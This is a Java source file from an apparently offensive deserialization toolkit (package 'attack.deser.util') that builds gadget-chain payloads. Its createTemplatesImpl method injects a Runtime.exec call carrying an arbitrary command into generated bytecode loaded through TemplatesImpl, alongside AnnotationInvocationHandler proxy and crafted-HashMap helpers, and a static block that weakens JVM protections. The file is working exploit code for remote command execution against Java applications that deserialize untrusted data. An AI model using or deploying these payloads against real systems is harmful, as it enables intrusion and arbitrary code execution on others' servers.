

package com.summersec.attack.deser.util;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

public class Gadgets_orgin {
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public Gadgets_orgin() {
    }

    public static <T> T createMemoitizedProxy(Map<String, Object> map, Class<T> iface, Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler(Map<String, Object> map) throws Exception {
        return (InvocationHandler)Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Override.class, map);
    }

    public static <T> T createProxy(InvocationHandler ih, Class<T> iface, Class<?>... ifaces) {
        Class<?>[] allIfaces = (Class[])((Class[])Array.newInstance(Class.class, ifaces.length + 1));
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }

        return iface.cast(Proxy.newProxyInstance(Gadgets_orgin.class.getClassLoader(), allIfaces, ih));
    }

    public static Map<String, Object> createMap(String key, Object val) {
        Map<String, Object> map = new HashMap();
        map.put(key, val);
        return map;
    }

    public static Object createTemplatesImpl(String command) throws Exception {
        return Boolean.parseBoolean(System.getProperty("properXalan", "false")) ? createTemplatesImpl(command, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl")) : createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static <T> T createTemplatesImpl(String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        T templates = tplClass.newInstance();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Gadgets_orgin.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass clazz = pool.get(Gadgets_orgin.StubTransletPayload.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") + "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("dogeser.doge");
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        byte[] classBytes = clazz.toBytecode();
        System.out.println(Arrays.toString(classBytes));
        System.out.println(Arrays.toString(ClassFiles.classAsBytes(Gadgets_orgin.Foo.class)));
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        Reflections.setFieldValue(templates, "_name", "Doge");
//        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);

        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException var6) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }

        Constructor nodeCons = nodeC.getDeclaredConstructor(Integer.TYPE, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    static {
        System.setProperty("jdk.xml.enableTemplatesImplDeserialization", "true");
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;

        public Foo() {
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;

        public StubTransletPayload() {
        }

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }
}
